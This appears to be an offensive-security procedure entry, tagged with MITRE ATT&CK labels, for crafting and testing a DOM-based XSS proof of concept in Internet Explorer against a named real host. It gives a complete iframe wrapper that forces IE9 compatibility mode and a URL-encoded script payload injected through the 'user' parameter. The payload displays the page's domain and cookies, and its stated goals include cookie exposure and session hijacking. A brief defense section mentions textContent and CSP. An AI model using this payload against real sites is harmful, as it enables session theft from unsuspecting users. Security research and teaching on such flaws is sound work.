---
id: proc-craft-xss-execution-poc-ie
tags:
  - xss
  - javascript-execution
  - ie-vulnerability
type: procedure
tools: []
tactics:
  - '[[Execution]]'
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:23.429Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft and Test XSS Execution PoC in IE

## Summary

This procedure creates and executes a JavaScript payload in Internet Explorer to demonstrate full DOM-based XSS, including alerts for domain and cookie exposure, simulating session hijacking.

## Description

Using an iframe with IE=9 compatibility mode, the PoC injects a <script> tag via the 'user' parameter, triggering alerts. This exploits the lack of sanitization, allowing arbitrary JS in older IE versions, with potential for data exfiltration.

## Requirements

1. Internet Explorer (or compatibility mode in modern browser)
2. HTML file for iframe setup
3. URL encoding knowledge for payload

## Defense

Defensive measures and detection strategies:

- Avoid innerHTML; use textContent or createTextNode
- Implement XSS filters and CSP nonce
- Detect JS alerts or anomalous script loads in browser logs

## Objectives

1. Execute JS payload in victim browser
2. Expose sensitive data like cookies
3. Validate impact in legacy browsers

## Instructions

### Step 1: Prepare Iframe HTML

**Context**: Set up an iframe to force IE9 mode.

Create an HTML file: <html><head><meta http-equiv="X-UA-Compatible" content="IE=9"></head><body><iframe src="http://nutty.ubnt.com/github-btn.html?..."></iframe></body></html>.

**Expected Output**: Iframe ready with compatibility header.

### Step 2: Encode and Craft Payload URL

**Context**: Build URL with JS injection.

Payload: <script>alert(document.domain);alert(document.cookie);// Use URL: http://nutty.ubnt.com/github-btn.html?%23%26user=yrdy%3Cscript%3Ealert(document.domain);alert(document.cookie);//%26type=follow (encoded).

**Expected Output**: Encoded URL for insertion into iframe src.

### Step 3: Load and Execute

**Context**: Trigger the XSS in the iframe.

Open the HTML file in IE and load. Watch for alerts.

**Expected Output**: Two alerts: one with nutty.ubnt.com, one with cookies.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]
- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[javascript-execution]]
- [[ie-vulnerability]]
